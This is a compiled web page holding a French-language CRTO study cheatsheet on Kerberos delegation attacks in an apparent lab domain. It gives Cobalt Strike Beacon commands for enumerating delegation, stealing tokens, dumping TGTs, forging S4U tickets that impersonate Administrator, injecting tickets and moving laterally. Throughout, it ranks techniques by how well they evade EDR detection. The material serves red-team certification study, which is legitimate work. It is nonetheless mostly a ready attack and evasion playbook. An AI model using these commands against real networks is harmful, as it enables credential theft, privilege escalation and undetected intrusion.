import{_ as a,o as t,c as s,ao as i}from"./chunks/framework.CjV1-naZ.js";const h=JSON.parse('{"title":"Cheatsheet - Kerberos","description":"","frontmatter":{"pageClass":"crto-page","prev":false,"next":false},"headers":[],"relativePath":"crto/liham/cheatsheets/kerberos.md","filePath":"crto/liham/cheatsheets/kerberos.md"}'),n={name:"crto/liham/cheatsheets/kerberos.md"};function o(l,e,r,c,d,p){return t(),s("div",null,e[0]||(e[0]=[i(`<h1 id="cheatsheet-kerberos" tabindex="-1">Cheatsheet - Kerberos <a class="header-anchor" href="#cheatsheet-kerberos" aria-label="Permalink to &quot;Cheatsheet - Kerberos&quot;">​</a></h1><ul><li>Unconstrained Delegation</li><li>Constrained Delegation</li><li>Service Name Substitution</li><li>S4U2self - Compromission d&#39;un compte machine</li><li>Resource-Based Constrained Delegation</li><li>Lateral Movement Services</li></ul><hr><h2 id="unconstrained-delegation" tabindex="-1">Unconstrained Delegation <a class="header-anchor" href="#unconstrained-delegation" aria-label="Permalink to &quot;Unconstrained Delegation&quot;">​</a></h2><blockquote><p>Énumération :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname</span></span></code></pre></div><blockquote><p>Rubeus monitor - capture du TGT :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe monitor /nowrap</span></span></code></pre></div><blockquote><p>Récupérer le token utilisateur depuis la machine compromise avec le menu Cobalt Strike :</p></blockquote><blockquote><p>Ouvrir Cobalt Strike &gt; clic droit sur le Beacon &gt; Explorer &gt; Process List &gt; trier les processus &gt; sélectionner le token de l&#39;utilisateur &gt; Steal Token.</p></blockquote><blockquote><p>Effectuer le jump vers la cible en Unconstrained Delegation, dans l&#39;ordre indiqué :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span># OPSEC-SAFE (preferred) - WinRM, no service modification, no disk write</span></span>
<span class="line"><span>jump winrm64 lon-ws-1 smb</span></span>
<span class="line"><span></span></span>
<span class="line"><span># OPSEC-CAUTION (fallback) - SCShell, modifies existing service ImagePath via SCM</span></span>
<span class="line"><span># Generates: Event 7040 (service config changed), 4697, 4688, SCM RPC events</span></span>
<span class="line"><span># Use only if WinRM is unavailable or blocked</span></span>
<span class="line"><span>jump scshell64 lon-ws-1 smb</span></span></code></pre></div><blockquote><p>Interagir ensuite avec le nouveau Beacon du Web Server.</p></blockquote><hr><h3 id="fork-run-pourquoi-le-limiter-et-quelles-alternatives-utiliser" tabindex="-1">Fork &amp; Run - Pourquoi le limiter et quelles alternatives utiliser <a class="header-anchor" href="#fork-run-pourquoi-le-limiter-et-quelles-alternatives-utiliser" aria-label="Permalink to &quot;Fork &amp; Run - Pourquoi le limiter et quelles alternatives utiliser&quot;">​</a></h3><p><strong>Fonctionnement de fork &amp; run :</strong> Les commandes post-exploitation de Cobalt Strike (<code>execute-assembly</code>, <code>powerpick</code>, <code>mimikatz</code>, etc.) peuvent créer un child process temporaire (<code>spawnto</code>), injecter une DLL reflective, exécuter le payload puis fermer le processus.</p><p><strong>Pourquoi l&#39;EDR peut détecter cette activité :</strong></p><ul><li>Un Beacon parent (<code>dllhost.exe</code>) qui lance <code>rundll32.exe</code> sans argument produit un parent–child process inhabituel.</li><li>Une mémoire <code>RWX</code> dans le processus enfant, sans image disque associée, peut signaler une injection en mémoire.</li><li>Les hooks EDR sur <code>NtCreateProcess</code>, <code>VirtualAllocEx</code> ou <code>CreateRemoteThread</code> peuvent observer les opérations fork &amp; run.</li></ul><p><strong>Modèle privilégié - BOF (<code>inline-execute</code>) :</strong></p><ul><li>Exécute du code C position-independent directement dans le thread du Beacon.</li><li>Pas de nouveau child process ni d&#39;injection cross-process dans un autre processus.</li><li>Pas d&#39;événement de création parent–child propre à ce modèle d&#39;exécution.</li></ul><table tabindex="0"><thead><tr><th>Commande</th><th>Modèle d&#39;exécution</th><th>Nouveau processus</th><th>Risque EDR</th></tr></thead><tbody><tr><td><code>inline-execute</code> / BOF</td><td>Dans le thread Beacon</td><td>Aucun</td><td>Faible</td></tr><tr><td><code>krb_triage</code> / <code>krb_dump</code></td><td>BOF</td><td>Aucun</td><td>Faible</td></tr><tr><td><code>execute-assembly</code></td><td>Fork &amp; run → spawnto</td><td>Oui</td><td>Moyen (selon spawnto)</td></tr><tr><td><code>powerpick</code></td><td>Fork &amp; run → spawnto</td><td>Oui</td><td>Moyen</td></tr><tr><td><code>shell</code> / <code>run</code> / <code>powershell</code></td><td>Crée un child process cmd/powershell</td><td>Oui</td><td>Élevé - éviter</td></tr></tbody></table><p><strong>Réduire les artefacts de fork &amp; run si nécessaire :</strong> Configurer <code>spawnto</code> dans le Malleable C2 Profile pour désigner un processus hôte signé approprié :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>post-ex { set spawnto_x64 &quot;%windir%\\\\sysnative\\\\dllhost.exe&quot;; }</span></span></code></pre></div><p>Ou directement au niveau du Beacon :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>spawnto x64 %windir%\\sysnative\\dllhost.exe</span></span></code></pre></div><p>Cela change le processus lancé, mais ne supprime pas la télémétrie d&#39;injection. Les BOF restent privilégiés dans ces notes.</p><hr><blockquote><p>Récupérer le ticket de l&#39;utilisateur <code>dyork</code> sur le Web Server, avec un BOF plutôt que fork &amp; run :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_triage</span></span>
<span class="line"><span></span></span>
<span class="line"><span>krb_dump /luid:148e2b /service:krbtgt</span></span></code></pre></div><blockquote><p><code>OPSEC-CAUTION</code> - <code>krb_dump</code> utilise <code>LsaCallAuthenticationPackage</code> (API Kerberos). Il ne lit pas directement la mémoire LSASS, mais un EDR peut observer cet appel API. Avec BOF, aucun child process n&#39;est créé.</p></blockquote><blockquote><p>Injecter directement le ticket, sans écriture sur disque :</p></blockquote><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\dyork FakePass!</span></span>
<span class="line"><span>kerberos_ticket_use &lt;base64-ticket&gt;</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> - <code>kerberos_ticket_use</code> injecte en mémoire le ticket dans la session de logon du Beacon, sans fichier sur disque ni child process.</p></blockquote><p>Le lab illustre l&#39;obtention d&#39;un accès administrateur au Web Server via Unconstrained Delegation et l&#39;utilisation du token d&#39;un compte administrateur local.</p><hr><h2 id="execution-de-commandes-distantes-reduire-la-detection-av-edr" tabindex="-1">Exécution de commandes distantes - Réduire la détection AV/EDR <a class="header-anchor" href="#execution-de-commandes-distantes-reduire-la-detection-av-edr" aria-label="Permalink to &quot;Exécution de commandes distantes - Réduire la détection AV/EDR&quot;">​</a></h2><p>À utiliser pour obtenir des résultats de reconnaissance depuis un Beacon en limitant les alertes liées à la création de processus.</p><h3 id="niveau-1-opsec-safe-bof-dans-le-thread-beacon" tabindex="-1">Niveau 1 - OPSEC-SAFE : BOF dans le thread Beacon <a class="header-anchor" href="#niveau-1-opsec-safe-bof-dans-le-thread-beacon" aria-label="Permalink to &quot;Niveau 1 - OPSEC-SAFE : BOF dans le thread Beacon&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>inline-execute sysinfo.o</span></span></code></pre></div><p>Aucun lancement de <code>systeminfo.exe</code> ni de child process : l&#39;exécution reste dans le thread Beacon. Préféré lorsqu&#39;un BOF sysinfo est chargé sur le team server.</p><hr><h3 id="niveau-2-opsec-caution-powerpick-et-wmi-fork-run" tabindex="-1">Niveau 2 - OPSEC-CAUTION : <code>powerpick</code> et WMI (fork &amp; run) <a class="header-anchor" href="#niveau-2-opsec-caution-powerpick-et-wmi-fork-run" aria-label="Permalink to &quot;Niveau 2 - OPSEC-CAUTION : \`powerpick\` et WMI (fork &amp; run)&quot;">​</a></h3><p>Collecte les mêmes données que <code>systeminfo</code> sans exécuter son binaire. Fonctionne avec fork &amp; run dans le processus <code>spawnto</code>, configuré ici sur <code>dllhost.exe</code>.</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>powerpick Get-WmiObject Win32_OperatingSystem | Select Caption,Version,OSArchitecture,CSName</span></span>
<span class="line"><span>powerpick Get-WmiObject Win32_ComputerSystem | Select Domain,TotalPhysicalMemory,Manufacturer,Model</span></span>
<span class="line"><span>powerpick Get-WmiObject Win32_NetworkAdapterConfiguration -Filter &quot;IPEnabled=True&quot; | Select IPAddress,DefaultIPGateway,DNSServerSearchOrder</span></span></code></pre></div><hr><h3 id="niveau-3-opsec-caution-run-createprocess-direct" tabindex="-1">Niveau 3 - OPSEC-CAUTION : <code>run</code> (CreateProcess direct) <a class="header-anchor" href="#niveau-3-opsec-caution-run-createprocess-direct" aria-label="Permalink to &quot;Niveau 3 - OPSEC-CAUTION : \`run\` (CreateProcess direct)&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>run systeminfo</span></span></code></pre></div><p>Lance <code>systeminfo.exe</code> directement via <code>CreateProcess</code>, sans passer par <code>cmd.exe</code>. Ce binaire de reconnaissance possède des signatures comportementales connues : privilégier les niveaux 1 ou 2.</p><hr><h3 id="methodes-a-eviter" tabindex="-1">Méthodes à éviter <a class="header-anchor" href="#methodes-a-eviter" aria-label="Permalink to &quot;Méthodes à éviter&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>shell systeminfo      ← OPSEC-UNSAFE: beacon → cmd.exe → systeminfo.exe</span></span>
<span class="line"><span>powershell systeminfo ← OPSEC-UNSAFE: spawns powershell.exe</span></span></code></pre></div><table tabindex="0"><thead><tr><th>Méthode</th><th>Binaire lancé</th><th>Child process</th><th>Risque EDR</th></tr></thead><tbody><tr><td><code>inline-execute sysinfo.o</code></td><td>Aucun</td><td>Aucun</td><td>Faible</td></tr><tr><td><code>powerpick</code> + WMI</td><td>spawnto (<code>dllhost.exe</code>)</td><td>Oui</td><td>Moyen</td></tr><tr><td><code>run systeminfo</code></td><td><code>systeminfo.exe</code></td><td>Oui</td><td>Moyen à élevé</td></tr><tr><td><code>shell systeminfo</code></td><td><code>cmd.exe</code> + <code>systeminfo.exe</code></td><td>Oui</td><td>Élevé - éviter</td></tr></tbody></table><hr><h2 id="constrained-delegation" tabindex="-1">Constrained Delegation <a class="header-anchor" href="#constrained-delegation" aria-label="Permalink to &quot;Constrained Delegation&quot;">​</a></h2><p>La <strong>Constrained Delegation</strong> limite les services back-end auxquels un principal peut déléguer l&#39;authentification. Contrairement à l&#39;Unconstrained Delegation, le TGT de l&#39;utilisateur n&#39;est pas transféré. Le service utilise deux extensions Kerberos :</p><ul><li><strong>S4U2self</strong> - le service demande un ticket pour <em>lui-même</em> au nom d&#39;un utilisateur, sans son TGT ni son mot de passe.</li><li><strong>S4U2proxy</strong> - le service utilise ce ticket pour demander un ticket destiné au service back-end autorisé (<code>msDS-AllowedToDelegateTo</code>).</li></ul><p>Lorsque <strong><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></strong> est actif (Protocol Transition), le service peut effectuer une impersonation d&#39;autres utilisateurs, y compris Domain Admin, auprès du service délégué. Dans ce scénario, l&#39;accès à la machine déléguante et à son TGT permet d&#39;accéder au service back-end sous une identité privilégiée.</p><hr><h3 id="enumeration" tabindex="-1">Enumeration <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Enumeration&quot;">​</a></h3><p>Une seule requête LDAP permet de récupérer le compte délégant, les services autorisés et le flag UAC :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>ldapsearch (&amp;(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> - BOF, runs in beacon thread, no child process.</p></blockquote><p>Décoder la valeur <code>userAccountControl</code> pour vérifier la présence de <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>.<br> Exécuter cette commande sur le client Cobalt Strike de l&#39;Attacker Desktop (PowerShell local, pas via le Beacon) :</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#8B949E;"># Replace 16781312 with the actual userAccountControl value returned above</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::ToBoolean(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;">16781312</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;"> -band</span><span style="--shiki-light:#005CC5;--shiki-dark:#79C0FF;"> 16777216</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#8B949E;"># True = protocol transition enabled</span></span></code></pre></div><p>⚠️ <code>16781312</code> = <code>WORKSTATION_TRUST_ACCOUNT (0x1000)</code> + <code>TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)</code>. Si le résultat est <code>True</code>, le scénario S4U2self est possible.</p><hr><h3 id="exploitation" tabindex="-1">Exploitation <a class="header-anchor" href="#exploitation" aria-label="Permalink to &quot;Exploitation&quot;">​</a></h3><h4 id="etape-1-lateral-movement-vers-l-hote-delegant-lon-ws-1" tabindex="-1">Étape 1 - Lateral Movement vers l&#39;hôte délégant (<code>lon-ws-1</code>) <a class="header-anchor" href="#etape-1-lateral-movement-vers-l-hote-delegant-lon-ws-1" aria-label="Permalink to &quot;Étape 1 - Lateral Movement vers l&#39;hôte délégant (\`lon-ws-1\`)&quot;">​</a></h4><p>⚠️ Voir les étapes de <a href="./../labs/User-Impersonation-lab">Lateral Movement et User Impersonation</a>.</p><h4 id="etape-2-recuperer-le-tgt-du-compte-machine-via-bof" tabindex="-1">Étape 2 - Récupérer le TGT du compte machine via BOF <a class="header-anchor" href="#etape-2-recuperer-le-tgt-du-compte-machine-via-bof" aria-label="Permalink to &quot;Étape 2 - Récupérer le TGT du compte machine via BOF&quot;">​</a></h4><p>Le LUID <code>0x3e7</code> correspond à la session de logon du compte machine sur un hôte joint au domaine :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_dump /luid:3e7 /service:krbtgt</span></span></code></pre></div><blockquote><p><code>OPSEC-CAUTION</code> - BOF (no child process). Utilise l&#39;API Kerberos <code>LsaCallAuthenticationPackage</code>, potentiellement surveillée par l&#39;EDR, sans lecture directe de LSASS.</p></blockquote><h4 id="etape-3-obtenir-un-service-ticket-par-s4u-avec-un-bof" tabindex="-1">Étape 3 - Obtenir un service ticket par S4U avec un BOF <a class="header-anchor" href="#etape-3-obtenir-un-service-ticket-par-s4u-avec-un-bof" aria-label="Permalink to &quot;Étape 3 - Obtenir un service ticket par S4U avec un BOF&quot;">​</a></h4><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_s4u /ticket:[base64-TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> - <code>krb_s4u</code> est un BOF exécuté dans le thread Beacon, sans nouveau processus ni écriture sur disque. Les notes le privilégient à <code>execute-assembly Rubeus.exe s4u</code>, qui utilise fork &amp; run.</p></blockquote><p>Vérifier éventuellement le ticket obtenu :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>krb_describe /ticket:[base64-service-ticket]</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> - BOF, lecture seule du ticket.</p></blockquote><h4 id="etape-4-injecter-le-service-ticket-et-acceder-a-la-cible" tabindex="-1">Étape 4 - Injecter le service ticket et accéder à la cible <a class="header-anchor" href="#etape-4-injecter-le-service-ticket-et-acceder-a-la-cible" aria-label="Permalink to &quot;Étape 4 - Injecter le service ticket et accéder à la cible&quot;">​</a></h4><p>Les étapes se déroulent depuis le client Cobalt Strike et le Beacon ; le fichier <code>.kirbi</code> reste sur l&#39;Attacker Desktop, sans écriture sur la cible :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>make_token CONTOSO\\Administrator FakePass!</span></span></code></pre></div><p>Sur le client Cobalt Strike (PowerShell local) :</p><div class="language-powershell vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">[</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">IO.File</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::WriteAllBytes(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;C:\\Users\\Attacker\\Desktop\\cifs-lon-fs-1.kirbi&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;"> [</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF7B72;">Convert</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">]::FromBase64String(</span><span style="--shiki-light:#032F62;--shiki-dark:#A5D6FF;">&quot;[B64_SERVICE_TICKET]&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E6EDF3;">))</span></span></code></pre></div><p>De retour dans le Beacon :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\cifs-lon-fs-1.kirbi</span></span>
<span class="line"><span>ls \\\\lon-fs-1\\c$</span></span></code></pre></div><blockquote><p><code>OPSEC-SAFE</code> - <code>kerberos_ticket_use</code> injecte le ticket en mémoire dans la session de logon du Beacon. Le chemin du fichier correspond à l&#39;Attacker Desktop, pas à la cible.</p></blockquote><p>Terminer l&#39;impersonation après utilisation :</p><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>rev2self</span></span></code></pre></div><hr><h3 id="⚠️-a-eviter-s4u-avec-fork-run" tabindex="-1">⚠️ À éviter - S4U avec Fork &amp; Run <a class="header-anchor" href="#⚠️-a-eviter-s4u-avec-fork-run" aria-label="Permalink to &quot;⚠️ À éviter - S4U avec Fork &amp; Run&quot;">​</a></h3><div class="language- vp-adaptive-theme"><button title="Copier le code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark-default vp-code" tabindex="0"><code><span class="line"><span>execute-assembly Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:[TGT] /impersonateuser:Administrator /nowrap</span></span></code></pre></div><blockquote><p><code>OPSEC-CAUTION</code> - fork &amp; run crée un processus temporaire <code>spawnto</code>. Privilégier le BOF <code>krb_s4u</code> ; utiliser cette alternative uniquement si le BOF n&#39;est pas disponible sur le team server.</p></blockquote><h2 id="" tabindex="-1"><a class="header-anchor" href="#" aria-label="Permalink to &quot;&quot;">​</a></h2>`,94)]))}const b=a(n,[["render",o]]);export{h as __pageData,b as default};
